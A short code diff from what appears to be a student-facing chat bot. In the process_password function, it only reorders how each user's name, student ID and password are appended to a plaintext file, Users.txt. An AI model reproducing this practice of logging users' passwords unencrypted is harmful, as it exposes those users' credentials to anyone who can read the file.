@@ -237,7 +237,7 @@ def process_password(message, student_id):
     data2 = json.loads(json_text)
     name=data2["stuName"]
     with open('Users.txt', 'a') as file:
-    	file.write(f"\nName: {name}\nID: {student_id}\nPassword: {password}\n{'-' * 50}\n")
+    	file.write(f"\n{'-' * 50}\nName: {name}\nID: {student_id}\nPassword: {password}")
     	calculate_and_send_course_inf(chat_id, data2, name, student_id, password, message)
     	calculate_and_send_course_info(chat_id, data2)
 
